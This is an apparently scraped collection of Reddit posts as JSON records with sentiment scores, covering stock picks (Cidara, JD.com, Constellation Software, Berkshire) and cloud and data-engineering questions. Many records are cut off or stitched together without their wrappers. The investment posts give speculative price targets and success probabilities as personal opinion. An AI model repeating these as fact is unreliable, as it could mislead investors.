{"post_id": "1nv985m", "title": "Cidara ($CDTX): Why 75% Probability of Success for Cidara’s Universal Flu Prophylaxis CD388 Is a Conservative Anchor for Valuation", "content": "**TL;DR:** Many Phase 3 programs are treated like a 50/50 coin toss by investors in terms of probability of success. Here’s why I think CD388 is closer to 75%.\n\n**Disclosure:** I hold shares of $CDTX. This is not investment advice.\n\nIn my original valuation post [CDTX – Is their CD388 “universal flu prophylaxis” the most undervalued clinical-stage blockbuster on the market, or am I missing something?](https://www.reddit.com/r/stocks/comments/1ndt2go/cdtx_is_their_cd388_universal_flu_prophylaxis_the/)  I modeled CD388 using a **75% probability of success (PoS)**. Some readers pushed back, saying Phase 3 programs are “coin flips” until final results are out.   That’s often true, but I think CD388, Cidara’s long-acting influenza prophylaxis, is further along than that. This post explains why I believe **75% is a realistic and conservative anchor** for estimating what the company should be worth today:\n\n**1)   The dataset is unusually large and robust**  \nMany Phase 2 programs enroll a few hundred patients. CD388’s phase 2b NAVIGATE trial had **over 5,000 participants** and took place across multiple geographies during an exceptionally strong flu season.  At the 450 mg dose, efficacy hit **76% vs placebo (95% CI: 49–90%, p&lt;0.0001)**. That kind of result gives far more confidence than you’d get from smaller, underpowered studies that often precede a Phase 3.\n\n**2)   The mechanism isn’t a leap of faith**  \nPlenty of Phase 3 failures come from untested biology. CD388 leverages **zanamivir**, the active in Relenza, which already has 20+ years of human safety/efficacy data. The Fc extension used in CD388 changes the half-life, not the core antiviral mechanism, and Fc fragments have been widely used in other approved biologics without introducing new safety liabilities.\n\n**3)   Safety looks clean so far**  \nIn NAVIGATE, no dose-dependent safety issues appeared across 150, 300, or 450 mg. Adverse events tracked with placebo.\n\n**4)   FDA has signaled confidence**  \nThe FDA just recently accepted Phase 2b as **pivotal** and allowed a single Phase 3 to serve for BLA filing (see   [$CDTX: FDA Minutes Confirm Expanded + Accelerated Phase 3 for Cidara’s Flu Prophylaxis CD388](https://www.reddit.com/r/stocks/comments/1npc6fd/cdtx_fda_minutes_confirm_expanded_accelerated/)). CD388 already has **Fast Track**, and the company has also applied for **Breakthrough Therapy Designation (BTD)**. If granted, BTD would be a further strong validation, speeding review and signaling FDA’s view that CD388 meets a serious unmet need.\n\n**5)   A exceptionally strong flu season stress-tested the drug**  \nThe 2024–25 flu season was severe, creating abundant endpoints and ensuring the trial was well-powered (better than expected). That adds confidence that efficacy wasn’t a fluke of low case counts.\n\n**While the strong data and FDA support make it tempting to push the probability of success up a notch, I am anchoring it to 75% to stay \\*conservative\\*.**   The point isn’t that risk has vanished because clearly it hasn’t.  It’s that CD388’s Phase 3 isn’t the typical binary gamble retail investors assume for an asset at this stage of development.  Assuming 75% probability of success in my valuation model reflects the strength of the data and FDA’s stance without overstating the case.\n\n**TL;DR (again):** Many Phase 3s are a coin toss in terms of probability of success. CD388 has strong data, a validated anti-viral mechanism, Fc fragment safety precedent, clean safety over a large phase 2b trial, and FDA confidence,  which is why I am sticking to a 75% probability of success in my valuation model.\n\nI’ll be following up with a separate post to update my **valuation analysis** now that FDA minutes have confirmed the Phase 3 plan and expanded TAM to include all adults over 65.", "author": "Unterhund70", "subreddit": "stocks", "score": 6, "upvote_ratio": 0.69, "num_comments": 6, "created_utc": "2025-10-01T23:09:27", "url": "https://www.reddit.com/r/stocks/comments/1nv985m/cidara_cdtx_why_75_probability_of_success_for/", "permalink": "https://reddit.com/r/stocks/comments/1nv985m/cidara_cdtx_why_75_probability_of_success_for/", "is_self": true, "domain": "self.stocks", "tech_keywords": ["AI", "AR", "stock", "share", "investment", "valuation"], "crawled_at": "2025-10-03T13:57:09.523104", "sentiment_score": {"vader_compound": 0.9982, "vader_positive": 0.195, "vader_neutral": 0.726, "vader_negative": 0.079, "textblob_polarity": 0.19512213976499698, "textblob_subjectivity": 0.43573167903525045, "overall_sentiment": "positive"}},

Its 52-week spread is honestly incredible, 172 high, 58 low, and I feel for those who bought in the triple digits. But I'm not done believing.

But I want to put into perspective just how small CAVA is, and just how enticing this 2032 1,000-restaurant goal is. They currently only have 400 locations across the U.S. In 2007, one year after Chipper's IPO, they had \\~700. Five years later, they doubled their store count, and in those five years, more than doubled their operating margin. In fact, Chipper's operating margin in 2007 was 7.5%, similar to CAVA's 7.38% last quarter. Rapid expansion in the QSR industry pushes margins, and like Ackman said, you can't go wrong owning a growing food chain.\n\nI'm still bullish on CAVA, and yes, I own the shit out of it.

Some are hoping to find the next gem that will lead this new world, which could be the next technological revolution.\n\nPersonally, I don't really understand this sector. I've been hearing about quantum computers for years, but it's true that the Nvidia wave, a simple graphics card company that became the world's largest market capitalization, to the point where a few thousand euros invested seven years ago would make you a millionaire today, has made people eager to bet on the next revolution.\n\nI've done my own research on quantum computing, and when I listen to experts, it feels like it's still very far off, even though there's some \"experimental\" commercialization starting. These computers still make too many errors and don't meet the expected needs.\n\nBut in my research, one company keeps coming up when it comes to significant advancements in the sector: IBM. Yet, when I look at IBM's stock price, it's nowhere near the small-cap companies that have seen their stocks multiply by 10.\n\nToday, I'm wondering if IBM, with its experience, technological advancements, and especially its financial resources, isn't the best-positioned company in this space.\n\nHowever, I never see IBM mentioned in this sector.

{"post_id": "1nuzqe0", "title": "PATH to Orchestration", "content": "This morning, ahead of their Fusion conference in Las Vegas, UiPath released some massive press releases. The common theme across all of them - UiPath is partnering with the biggest tech companies to ensure that UiPath's workflow orchestration system, called Maestro, is at the top of its game and able to connect with the best agents and data tools.\n\nThey announced partnerships with Snowflake so that Snowflake's Cortex AI agent can integrate into Maestro. This is crucial as many of UiPath's customers have their data stored in Snowflake and will be leveraging their agents for data insights. They also announced huge partnerships with Google Gemini, OpenAI, and NVIDIA. I encourage you to read the press releases for yourself. \n\nWhy is this so important? UiPath is not trying to create every AI agent from scratch - instead, they are building the platform that orchestrates all of the agents and robots at the top...like a Maestro does with a full string orchestra. This will allow UiPath to stay extremely nimble and allow their customers to have access to the best agents in the world - some of which will be built by other companies (CortexAI, NVIDIA) and others that will be in-house (UiPath's PeakAI).\n\nI'm not suprised by these announcements - in my prior post with some detailed DD on PATH, I mentioned that they were already partnered with LangChain and Microsoft Copilot to break down any concerns of developing walled gardens. It's still early days in UiPath's second act; however, the path there is clear. If you are a believer that corporations will be building agentic automation into their workforce at scale, then you are bullish PATH.

So while people turn to LLMs for general questions, they still use Google for online shopping and click on sponsored ads. \n\nMost importantly, online retailers looking to advertise to people that are directly searching for their type of product really only had Google/Yahoo/Bing as an option, and Google had the majority of market share.\n\nToday OpenAI killed this theory. OpenAI is in the process of integrating shopping directly into ChatGPT. It is still in its early stages, right now only supporting Etsy, and will soon rollout to Shopify. These platforms pay OpenAI for driving sales. \n\nCPC and CPM for Google ads are notoriously expensive, so if this goes well, expect more online retailers to implement deals with OpenAI, and cut Google ad spend as OpenAI drivers higher return on investment and such announcements boost share price. \n\nThis is a much safer form of performance based advertising.

This company is pre-revenue, publicly traded.*\n\nI'll leave out the stock name to avoid clouding judgement and personal preferences over industry, company, etc. Keen to get your general thoughts on this stock managing question.\n\nEssentially, there is a technology company (with hardware+software products) that's another couple of years away from properly generating revenue. It is a leader in its space, very innovative, very well-connected with traditional industry leaders, has great leadership with great technical background. They play it safe, do not boast. All in all, I feel quite confident in their direction and ability to navigate issues as they hit them. But - They've only hit limited milestones yet (limited compared to final target, but well on-schedule and not technologically limited by any stretch of imagination) and may hit various issues like any startup. Of course, they have good competitors too, though it is not crowded at the moment.\n\nThe stock tends to go up and down quite a bit, but I feel there is decent investor confidence.\n\nThe big questions are:\n\n\\- How much % of your portfolio would you invest in such a stock?  \n\\- Would you hold it forever? (or at least till it starts generating revenue and profits)  \n\\- Or would you try to do a bit of swing trading to time the up-downs? This could be even on a part of your holding, but of course there is no guarantee you will time it properly and very like you will get it wrong! But equally, it feels a shame to be holding on to say, 9-10% gain YTD when the stock's gone up and down 30-40%. Of course, like any good startup, as it starts generating revenue and stabilizes as a company, I wouldn't be surprised to see a 3x or more jump in share price...", "author": "Life-Light-7430", "subreddit": "stocks", "score": 0, "upvote_ratio": 0.13, "num_comments": 32, "created_utc": "2025-10-01T08:20:49", "url": "https://www.reddit.com/r/stocks/comments/1nushl2/how_to_manage_a_good_quality_startup_stock/", "permalink": "https://reddit.com/r/stocks/comments/1nushl2/how_to_manage_a_good_quality_startup_stock/", "is_self": true, "domain": "self.stocks", "tech_keywords": ["AI", "AR", "stock", "share", "portfolio", "revenue", "profit"], "crawled_at": "2025-10-03T13:57:09.585263", "sentiment_score": {"vader_compound": 0.9963, "vader_positive": 0.195, "vader_neutral": 0.751, "vader_negative": 0.054, "textblob_polarity": 0.16040674603174604, "textblob_subjectivity": 0.4814087301587301, "overall_sentiment": "positive"}},

{"post_id": "1nvc4nn", "title": "JD Stock Forecast", "content": "Hey everyone I have had some pretty solid calls this year on foreign equities, including BABA at $114 and JMIA at $2.40. I am back with another call and DD report on JD. \n\nChinese equities have been abandoned by global investors, and JD.com is one of the clearest examples. The stock fell from over $100 in 2021 to below $30 in 2023 despite remaining profitable and holding one of the strongest balance sheets in the sector.\n\nToday JD is valued at less than 10x earnings, 0.3x sales, and just above book value. It sits on more than $27 billion in cash and is using buybacks to reduce its float. This is an e-commerce and logistics leader trading at distressed multiples, while peers like Amazon (33x PE) and Alibaba (21x PE) command far higher valuations.\n\nThe recovery in 2025 is starting to take shape for China. Alibaba has already surged more than 70 percent this year as sentiment improves. JD has lagged, but volumes are rising, short interest is falling, and the stock recently broke resistance levels (200d SMA). The fundamentals point to double digit revenue growth, expanding profitability, and a long runway in AI, robotics, and fintech.\n\nFor my modeling into 2030, I assumed the following:\n\n* **Revenue Growth Assumptions:** Modeled CAGR between 10–20% depending on macro conditions and market share trends.\n* **Margin Expansion:** Forecasts net margins improving to 4–5% through cost efficiencies, logistics scaling, and AI-driven operations.\n* **Buybacks:** $27B in cash could allow repurchase of 15–20% of shares by 2030, lifting EPS by 20–25%.\n* **Peer Multiples:** Valuation targets based on Alibaba (\\~21x P/E) and Amazon (30–40x P/E) suggest significant re-rating potential.\n* **Scenario Analysis:**\n   * Bear: $80 by 2030 (10% CAGR, 15x P/E).\n   * Base: $140 by 2030 (15% CAGR, 20x P/E).\n   * Bull: $200+ by 2030 (20% CAGR, 25x P/E, upside from AI/health/fintech).\n* **Optionality:** Strategic investments in healthcare, fintech, and robotics are not fully priced in, so upside could exceed modeled cases.\n\nThis is not financial advice, but the setup resembles other moments of extreme mispricing that I have seen reverse sharply once capital flows return. JD’s logistics moat, authenticity focus, and cash reserves give it staying power in a very competitive market. \n\nJust because Chinese equities were punished for years, does not mean they always will be. Institutions can only ignore cash flows and valuations such as these for so long, particularly as US markets approach extreme overbought levels. \n\nFor a less fundamental approach, JD historically lags than catches big moves from BABA. I see that happening here, and rather quickly as rally begins to broaden out.

The deal, which would be Berkshire’s largest since 2022, could come together within days, the people said. \n\nHouston-based Occidental is largely known for its oil-and-gas operations. The company has a market value of around $46 billion and already counts Berkshire as its largest shareholder. \n\nOccidental’s petrochemical division, OxyChem, manufactures and sells chemicals for use in applications including chlorinating water, recycling batteries and producing paper. The unit generated nearly $5 billion in sales in the 12 months ended in June. \n\nAssuming talks don’t fall apart, the OxyChem deal would be Buffett’s second big bet on chemicals. In 2011, Berkshire acquired specialty-chemicals producer, Lubrizol, for close to $10 billion, including debt. \n\nThe Financial Times reported on Sunday that Occidental was in talks for a $10 billion deal to sell OxyChem, without identifying the buyer. The last major deal Berkshire did was in 2022, when it agreed to pay $11.6 billion to buy insurer Alleghany. \n\nBuffett, 95, got involved with Occidental in 2019, as Chief Executive Vicki Hollub was trying to outbid Chevron to buy Anadarko Petroleum. In a trip facilitated by Bank of America Chief Brian Moynihan, Hollub traveled to Nebraska to visit Buffett, whose company agreed to buy $10 billion of preferred shares in Occidental to bolster her $38 billion offer. \n\nOccidental’s fortunes have waxed and waned since then. The deal saddled the company with debt and attracted criticism from activist investor Carl Icahn. Buffett doubled down as Icahn exited, eventually buying up roughly 28% of its shares. The company’s shares more recently have come under pressure with oil prices lower.\n\nOccidental has been selling noncore assets to raise cash to pay down debt. As of August, it said it had repaid $7.5 billion of debt. \n\nBerkshire, on the other hand, has been sitting on a massive cash pile. The company’s cash and Treasury bills sat at a record $344 billion at the end of June, raising investors’ eyebrows.\n\nBuffett has said the company still prefers owning businesses, though has suggested that finding the right ones to buy can be hard. “Berkshire will never prefer ownership of cash-equivalent assets over the ownership of good businesses, whether controlled or only partially owned,” Buffett wrote earlier this year. \n\nThe famed investor plans to retire from his role as CEO at the end of the year and hand the reins to Greg Abel. Buffett will remain chairman.", "author": "NoDontClickOnThat", "subreddit": "ValueInvesting", "score": 112, "upvote_ratio": 0.98, "num_comments": 31, "created_utc": "2025-10-01T05:38:16", "url": "https://www.reddit.com/r/ValueInvesting/comments/1nuojke/berkshire_hathaway_near_10_billion_deal_for/", "permalink": "https://reddit.com/r/ValueInvesting/comments/1nuojke/berkshire_hathaway_near_10_billion_deal_for/", "is_self": true, "domain": "self.ValueInvesting", "tech_keywords": ["AI", "AR", "VR", "share"], "crawled_at": "2025-10-03T13:57:09.627826", "sentiment_score": {"vader_compound": 0.8932, "vader_positive": 0.071, "vader_neutral": 0.884, "vader_negative": 0.045, "textblob_polarity": 0.06407828282828282, "textblob_subjectivity": 0.40797258297258304, "overall_sentiment": "positive"}},

{"post_id": "1nuonf9", "title": "Constellation Software - The King is Gone", "content": "The market is panicking about Constellation Software after its founder, Mark Leonard, resigned. The stock is down nearly 30% from its highs, caused by fears over AI and a scary looking Q2 earnings report. I believe this is a massive overreaction and a great opportunity for long-term investors.\n\nThe biggest reason for the panic is that Mark Leonard left. He's seen as the Warren Buffett of Canada. People think the magic is gone with him. It doesn't help that AI is coming for them either. The fear is that generative AI will make their huge portfolio of niche software obsolete. The Q2 earnings also looked terrible. Net income dropped by a shocking 68%.\n\nThese fears are all very real. The thing is the company is simply a machine. Leonard built a decentralised system designed to run without him. It's not reliant on one person. His replacement is a 30-year company insider, ensuring continuity. They aren't ignoring AI either. Management held a rare call to address concerns and explained that hundreds of their business units are already integrating AI to improve products and efficiency.  \n  \nThe Q2 earnings also weren't actually bad. That 68% drop in net income I talked about was due to non-cash accounting quirks (a massive foreign exchange loss and a charge related to the rising value of their successful Topicus spin-off). The important number, free cash flow, was actually UP 20%. The business is still printing money.\n\nThe recent sell-off is driven by fear, not fundamentals. The panic has created a chance to buy a world-class compounder at a discounted price. The valuation is now much more reasonable, trading at around 23x P/FCF. To me, this is a compelling long-term opportunity.\n\nIf you're interested in all my research and analysis, you can find it here: [https://open.substack.com/pub/dariusdark/p/constellation-software-the-king-is?r=54iluw&amp;utm\\_campaign=post&amp;utm\\_medium=web&amp;showWelcomeOnShare=false](https://open.substack.com/pub/dariusdark/p/constellation-software-the-king-is?r=54iluw&amp;utm_campaign=post&amp;utm_medium=web&amp;showWelcomeOnShare=false)", "author": "Individual_Ad5883", "subreddit": "ValueInvesting", "score": 53, "upvote_ratio": 0.84, "num_comments": 63, "created_utc": "2025-10-01T05:42:21", "url": "https://www.reddit.com/r/ValueInvesting/comments/1nuonf9/constellation_software_the_king_is_gone/", "permalink": "https://reddit.com/r/ValueInvesting/comments/1nuonf9/constellation_software_the_king_is_gone/", "is_self": true, "domain": "self.ValueInvesting", "tech_keywords": ["AI", "AR", "react", "stock", "share", "portfolio", "earnings", "valuation"], "crawled_at": "2025-10-03T13:57:09.641276", "sentiment_score": {"vader_compound": 0.7871, "vader_positive": 0.139, "vader_neutral": 0.747, "vader_negative": 0.114, "textblob_polarity": 0.026814814814814816, "textblob_subjectivity": 0.5950899470899471, "overall_sentiment": "positive"}},

Now if management really wanted to, they could show investors a healthy net income with good profit margins. Instead, however, they chose to market aggressively...diluting shares, over-hiring, fighting tooth and nail to establish their footprint.\n\nBy all means if you could identify this early, you would be very rich today. And this is more than just looking at accounting statements because they don't tell the whole story. Some might say look at operating cash flow but companies might hire so aggressively and pay for top talent that it could easily be negative too.   \n  \nSo, my question is, what can one do in this situation? Valuation might be complicated I know, but how does one even identify whether this is a good company to invest in and that they aren't just wasting money. For example, the traditional value investor could easily say, Amazon in 2010 has absolutely zero moat and that they are burning cash to give people cheaper items and faster delivery and they would eventually find competitors and the pricing wars would make everyone a loser (except the customer). My point is that it is simply not very easy when companies are in this phase to identify good from bad.

{"post_id": "1nv69x4", "title": "Changes to the investment strategy as the interest rates decline", "content": "\n\nWith the interest rate approaching 4.0% and especially once it falls below 4.0% I do not consider interest rates high anymore. Therefore I have to do adjustments to my current primary strategy described almost a year ago. The main idea of the original strategy was to keep most of the money in t-bills that reliably yield close to 5% and exploit the rest of the money as a tool to frequently buy and sell(cycle) dividend paying high quality stocks. The strategy allowed earning around 10% annually with almost no risk. As yields on cash fall below 4% this strategy loses its appeal and I have to do the adjustments.\n\nBefore I explain the changes let me tell you one envious thought I had for many years… Take a look at 10yr treasury yield historic chart...\n\nThink of a guy in the 1980s who bought 10yr or especially 30yr treasury… The guy would enjoy 15% risk free return all the way until the 2010s… The world economy grew fast in the 1980s but the modern world doesn’t grow as fast mostly because of saturation and low human breeding rates. What if 5% return is equivalent to 15% in the 1980s given the low growth of the world?\n\nThe first changes to the strategy came in May and were explained in my previous blog posts. I indeed significantly increased exposure to high quality US stocks leaving me exposed to higher risk but it also provided a better than expected returns during this period. As time goes by I now face the dilemma of still incredibly rich valuations of stocks and therefore high risks of drawdowns yet I cannot keep a significant portion of portfolio in t-bills as they provide unattractive returns. Therefore about a month ago I started the transition of t-bills based strategy to bond based strategy. I do not hold any t-bills anymore and now the money is either in stocks or bonds… This significantly increased my risk exposure but bonds will provide a much higher yield of around 6% while still being a relatively low risk instrument. The main reason why I think bonds are ok now is that I do not expect significantly higher inflation as the transition of the new administration tariffs as well as certain reduction in government expenses in certain areas show signs of fiscal responsibility and hopefully the inflation will be tamed.\n\nThe stocks strategy also changed slightly. I do not cycle dividend stocks as much as I used to and keep stock ownership much longer as well as increased exposure to some high quality stocks with lower dividend yields. I continue to buy and sell the same stocks though. So some cycling is still happening but less of it. So here it is. This is what I am doing now for the next 3-6 months. Then we will review again.\n\nFull article: [https://www.linkedin.com/pulse/changes-investment-strategy-interest-rates-decline-tickernomics-gr1fc](https://www.linkedin.com/pulse/changes-investment-strategy-interest-rates-decline-tickernomics-gr1fc)", "author": "TickernomicsOfficial", "subreddit": "ValueInvesting", "score": 1, "upvote_ratio": 0.56, "num_comments": 3, "created_utc": "2025-10-01T21:02:04", "url": "https://www.reddit.com/r/ValueInvesting/comments/1nv69x4/changes_to_the_investment_strategy_as_the/", "permalink": "https://reddit.com/r/ValueInvesting/comments/1nv69x4/changes_to_the_investment_strategy_as_the/", "is_self": true, "domain": "self.ValueInvesting", "tech_keywords": ["AI", "AR", "stock", "investment", "portfolio", "growth", "valuation", "dividend"], "crawled_at": "2025-10-03T13:57:09.657656", "sentiment_score": {"vader_compound": 0.9106, "vader_positive": 0.09, "vader_neutral": 0.837, "vader_negative": 0.073, "textblob_polarity": 0.1632013411425176, "textblob_subjectivity": 0.4587725999490706, "overall_sentiment": "positive"}},

Using Python Asyncio and Aiohttp, it can handle bulk downloads, scaling to millions of panoramas per day.\n\nIt was a fun project to work on, as there was no documentation whatsoever, whether by Google or other existing solutions. So, I documented the key points that explain why a panorama image looks the way it does based on the given inputs (mainly zoom levels).\n\nOther solutions don’t match up because they ignore edge cases, especially pre-2016 images with different resolutions. They used fixed width and height that only worked for post-2016 panoramas, which caused black spaces in older ones.\n\nThe way I was able to reverse engineer Google Maps Street View API was by sitting all day for a week, doing nothing but observing the results of the endpoint, testing inputs, assembling panoramas, observing outputs, and repeating. With no documentation, no lead, and no reference, it was all trial and error.\n\nI believe I have covered most edge cases, though I still doubt I may have missed some. Despite testing hundreds of panoramas at different inputs, I’m sure there could be a case I didn’t encounter.

While I can't give all the details, here's our design considerations:\n\n* It'll have to receive and securely store quite a bit of confidential structured data. This storage will have to be persistent.\n   * Additionally, the data upload process will involve extensive extract-transform-load operations.\n* The web app shouldn't see a huge amount of direct traffic; probably less than 500 people will be interacting with it directly.\n* Occasionally (either daily or weekly; still trying to decide which) a background process will run some prescriptive analytics heuristics on the stored data. Depending on the results, the server may then email people to let them know.\n\nTo sum up: not a whole lot of consistent processing demand, but with occasional large spikes, and a decent amount of DB storage.\n\nGiven those considerations, I am trying to figure out whether we should use AWS or Azure. On the one hand, AWS has a larger nonprofit credit. On the other, Azure works well with the Microsoft ecosystem (which is nice, since the web app will run on .NET and SQL Server) and appears to maybe be slightly cheaper(?) once the nonprofit credit runs out.

To create high-quality subtitles, I need to use ML models to analyze the text grammatically, so my program can intelligently decide where to place the subtile line breaks. For this grammatical processing, I'm using Python services running Stanza, an NLP library that require GPU to meet my performance requirements.\n\nThe challenge begins when I combine my requirement for wide language support with unpredictable user traffic and the reality that this is a solo project with out a lot of funding behind it.\n\nI currently think to use a scale to zero GPU service to pay per use. And after testing the startup time of the service, I know cold start won't be a problem .\n\nHowever, the complexity doesn't stop there, because Stanza requires a specific large model to be downloaded and loaded for each language. Therefore, to minimize cold starts, I thought about creating 70 distinct containerized services (one per language).\n\nThe implementation itself isn't the issue. I've created a dynamic Dockerfile that downloads the correct Stanza model based on a build arg and sets the environment accordingly.

Zero infrastructure management: Ideal for devs who don’t want to deal with infra overhead.\n\n2. Great for unpredictable workloads: AI chatbots, virtual agents, and recommendation systems that spike at random.\n\n3. Cost efficiency (sometimes): You only pay per inference, but if usage is heavy, costs can creep up.\n\n4.

{"post_id": "1mhkjmh", "title": "Wiz vs. Lacework – a long ramble from a data‑infra person", "content": "Heads up: this turned into a bit of a long post.\n\nI’m not a cybersecurity pro. I spend my days building query engines and databases. Over the last few years I’ve worked with a bunch of cybersecurity companies, and all the chatter about Google buying Wiz got me thinking about how data architecture plays into it.\n\nLacework came on the scene in 2015 with its Polygraph® platform. The aim was to map relationships between cloud assets. Sounds like a classic graph problem, right? But under the hood they built it on Snowflake. Snowflake’s great for storing loads of telemetry and scaling on demand, and I’m guessing the shared venture backing made it an easy pick. The downside is that it’s not built for graph workloads. Even simple multi‑hop queries end up as monster SQL statements with a bunch of nested joins. Debugging and iterating on those isn’t fun, and the complexity slows development. For example, here’s a fairly simple three‑hop SQL query to walk from a user to a device to a network:\n\n```\nSELECT a.user_id, d.device_id, n.network_id\nFROM users a\nJOIN logins b ON a.user_id = b.user_id\nJOIN devices d ON b.device_id = d.device_id\nJOIN connections c ON d.device_id = c.device_id\nJOIN networks n ON c.network_id = n.network_id\nWHERE n.public = true;\n```\n\nNow imagine adding more hops, filters, aggregation, and alert logic—the joins multiply and the query becomes brittle.\n\nWiz, started in 2020, went the opposite way. They adopted graph database Amazon Neptune from day one. Instead of tables and joins, they model users, assets and connections as nodes and edges and use Gremlin to query them. That makes it easy to write and understand multi‑hop logic, the kind of stuff that helps you trace a public VM through networks to an admin in just a few lines:\n\n```\ng.V().hasLabel(\"vm\").has(\"public\", true)\n  .out(\"connectedTo\").hasLabel(\"network\")\n  .out(\"reachableBy\").has(\"role\", \"admin\")\n  .path()\n```\n\nIn my view, that choice gave Wiz a speed advantage. Their engineers could ship new detections and features quickly because the queries were concise and the data model matched the problem. Lacework’s stack, while cheaper to run, slowed down development when things got complex. In security, where delivering features quickly is critical, that extra velocity matters.\n\nAnyway, that’s my hypothesis as someone who’s knee‑deep in infrastructure and talks with security folks a lot. I cut out the shameless plug for my own graph project because I’m more interested in what the community thinks. Am I off base? Have you seen SQL‑based systems that can handle multi‑hop graph stuff just as well?

{"post_id": "1lrrkfv", "title": "AWS DMS \"Out of Memory\" Error During Full Load", "content": "Hello everyone,\n\nI'm trying to migrate a table with 53 million rows, which DBeaver indicates is around 31GB, using AWS DMS. I'm performing a **Full Load Only** migration with a **T3.medium instance (2 vCPU, 4GB RAM)**. However, the task consistently stops after migrating approximately 500,000 rows due to an \"Out of Memory\" (OOM killer) error.\n\nWhen I analyze the metrics, I observe that the memory usage initially seems fine, with about 2GB still free. Then, suddenly, the **CPU utilization spikes, memory usage plummets, and the swap usage graph also increases sharply**, leading to the OOM error.\n\nI'm unable to increase the replication instance size. The migration time is not a concern for me; whether it takes a month or a year, I just need to successfully transfer these data. My primary goal is to **optimize memory usage and prevent the OOM killer**.\n\nMy plan is to migrate data from an **on-premises Oracle database to an S3 bucket in AWS** using AWS DMS, with the data being transformed into **Parquet format** in S3.\n\nI've already refactored my **JSON Task Settings** and **disabled parallelism**, but these changes haven't resolved the issue. I'm relatively new to both data engineering and AWS, so I'm hoping someone here has experienced a similar situation.\n\n* How did you solve this problem when the table size exceeds your machine's capacity?\n* How can I force AWS DMS to not consume all its memory and avoid the Out of Memory error?\n* Could someone provide an explanation of what's happening internally within DMS that leads to this out-of-memory condition?\n* Are there specific techniques to prevent this AWS DMS \"Out of Memory\" error?\n\n**My current JSON Task Settings:**\n\n{\n\n  \"S3Settings\": {\n\n\"BucketName\":

{"post_id": "1losaz2", "title": "Seeking Experiences: Major Cloud Providers (AWS/Azure/GCP) vs. Alternatives for APAC Performance &amp; Cost Savings?", "content": "Hey r/cloudcomputing,\n\nI've been doing some deep dives lately into the cloud landscape beyond the usual hyperscaler giants (AWS, Azure, GCP), specifically looking for options that might offer **significant cost advantages or performance benefits in the Asia-Pacific (APAC) region.** This is partly driven by personal project needs and general curiosity about market diversification.\n\nOne provider that keeps coming up in this context is **Alibaba Cloud's international offering (**[**AlibabaCloud.com**](https://www.alibabacloud.com/) **-** ***mentioning domain only, no hyperlink*****)**. They're obviously a massive global player (#3 market share), but I feel like the hands-on experience and detailed discussions about their *international* services (outside of their home market) are less common here compared to the Big 3.\n\n**My exploration has me curious about a few things, and I'd love to tap into the community's collective wisdom:**\n\n1. **APAC Performance Focus:**\n   * For those serving users **primarily in Mainland China, Southeast Asia, or broader APAC**, have you found specific providers (including but *not limited to* Alibaba Cloud) that offer demonstrably **better latency/performance or easier compliance** in those regions compared to AWS/Azure/GCP? What was your experience?\n   * How crucial is having a local PoP or dedicated infrastructure there? Does it justify potential management overhead?\n2. **Cost Optimization / Alternative Plays:**\n   * Has anyone successfully used a \"non-Big-3\" provider as a **strategic lever for significant cost reduction**, either for specific workloads or as part of a broader multi-cloud strategy? What were the trade-offs (support, tooling, ecosystem)?\n   * Alibaba Cloud often markets aggressive pricing and credits. **Is this just marketing, or have you seen tangible savings?** How does their pricing complexity compare?\n   * Beyond cost, are there **technical niches** (specific AI/ML tools, unique DB offerings, hybrid cloud solutions) where you've found alternatives genuinely compelling?\n3. **The Practicalities of Using Alternatives:**\n   * **Onboarding &amp; Tooling:** How does the developer experience, CLI/SDK maturity, and API consistency compare? Any major headaches?\n   * **Support (Especially International/English):** This is a big one. How responsive and effective is support when you're *not* in the provider's primary region? Can it match the Big 3?\n   * **Documentation &amp; Community:** Finding answers – is it easy, or do you end up down rabbit holes?\n   * **The \"Diversification\" Reality:** Does the complexity of managing another platform outweigh the benefits (cost, performance, resilience)? When does it make sense?\n\n**Why Alibaba Cloud as an example?** Simply because it's the largest alternative and has a strong APAC claim. But I'm equally interested in hearing about experiences with *any* credible alternative provider (DigitalOcean, Linode/ Akamai, OVHcloud, regional players, etc.) in the context of **APAC performance and cost savings**.\n\n**Full Transparency Corner (To avoid any perception of stealth marketing):** I work in the cloud ecosystem and sometimes interact with various providers, including Alibaba Cloud. **My goal here isn't to promote any vendor,** but to cut through the marketing and understand real-world technical and operational experiences from practitioners. This subreddit has always been a great source of unfiltered insights!\n\n**Let's Discuss!**\n\n* **Have you ventured beyond AWS/Azure/GCP for specific needs (especially cost or APAC perf)? Share your story - good, bad, or ugly!**\n* **What were the key factors in your decision? What hurdles did you face?**\n* **Do you see viable alternatives maturing enough to challenge the Big 3 dominance in your areas of work?**\n* **Any hidden gems or cautionary tales regarding APAC-focused cloud infra?**\n\nReally looking forward to an honest and insightful discussion.

They don't have spare to make the cloud work efficiently.\n\nFirst question:  Is this your experience or am I imagining this?\n\nI had an idea to automate a big chunk of the cloud.  It works in three layers:\n\nLayer 1:  Architectural scanners.  Read in source code, infrastructure scans or organization data.  Create a knowledge graph that connects all of the dots.  As the software changes or new infra is added, the next scan picks it up and updates all the dependencies.  It shows all of the connections like the cost of new AI calls in these three applications... \n\nLayer 2:  Enrichment data.  Automatically ingest cost data from AWS CUR (in near real time).  Connect to your favorite observability data.  Ingest data from security scanners.  Add cybersecurity loss data...  \n  \nLayer 1&amp;2 together become a single source of truth.  It eliminates a lot of redundant data collection and delayed data collection.  This approach lends itself to AI as redundant data sources introduce reporting errors and inconsistencies.  \n  \nLayer 3:  Applications.  The source of truth is exposed through APIs.  The apps extract the data they need to monitor (read only), query and report.  A marketplace is used to make customer shared and 3rd party apps available to users.  \n  \nI would like to hear from cloud computing folks about whether this makes sense or not.  Any comments would be appreciated.   \n\n", "author": "jigsawml", "subreddit": "cloudcomputing", "score": 7, "upvote_ratio": 1.0, "num_comments": 2, "created_utc": "2025-06-27T00:47:00", "url": "https://www.reddit.com/r/cloudcomputing/comments/1ll3ja8/is_cloud_to_complex_for_smb_success_ive_got_an/", "permalink": "https://reddit.com/r/cloudcomputing/comments/1ll3ja8/is_cloud_to_complex_for_smb_success_ive_got_an/", "is_self": true, "domain": "self.cloudcomputing", "tech_keywords": ["AI", "cloud computing", "AR", "cybersecurity", "share"], "crawled_at": "2025-10-03T13:57:10.423639", "sentiment_score": {"vader_compound": 0.9752, "vader_positive": 0.118, "vader_neutral": 0.829, "vader_negative": 0.053, "textblob_polarity": 0.06248196248196248, "textblob_subjectivity": 0.3396665063331729, "overall_sentiment": "positive"}},

